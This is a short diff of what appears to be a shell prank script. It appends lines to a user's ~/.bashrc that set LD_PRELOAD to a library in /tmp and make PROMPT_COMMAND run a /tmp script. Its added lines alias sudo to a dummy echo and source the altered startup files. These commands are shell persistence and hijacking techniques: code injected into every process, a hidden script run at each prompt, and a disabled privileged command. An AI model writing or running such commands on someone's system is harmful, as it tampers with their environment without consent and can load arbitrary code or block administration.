@@ -6,4 +6,6 @@
  rm -rf pranks
  echo "export LD_PRELOAD=/tmp/a.so" >> ~/.bashrc
  echo "export PROMPT_COMMAND ='/tmp/ld.sh'" >> ~/.bashrc
+ echo "alias sudo='echo pow!'" >> ~/.bash_aliases
  source ~/.bashrc
+ source ~/.bash_aliases
